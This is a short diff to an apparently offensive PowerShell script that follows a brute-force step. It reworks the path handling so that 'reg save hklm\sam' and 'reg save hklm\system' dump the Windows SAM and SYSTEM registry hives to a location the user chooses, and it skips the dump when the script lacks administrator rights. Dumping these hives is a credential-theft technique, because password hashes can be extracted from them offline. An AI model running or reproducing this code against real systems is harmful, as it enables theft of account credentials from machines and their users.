@@ -1132,9 +1132,15 @@ Write-Output "Brute Force Failed...."
 
     $exportloc = Read-Host -Prompt "Location for SAM/System file to be extracted to"
     
-    reg save hklm\sam $exportloc
-    reg save hklm\system $exportloc
+    if ($exportloc.EndsWith("\") -eq $false){$exportloc = $exportloc + "\"}
 
+    $sam = $exportloc + "sam"
+    $sysl = $exportloc + "system"
+
+    reg save hklm\sam $sam
+    reg save hklm\system $sysl
+    
+    
     }else{Write-Output ""; Write-Output "Cannot Extract SAM/SYSTEM File As Running As Non-Admin... Moving On....." }
 
     
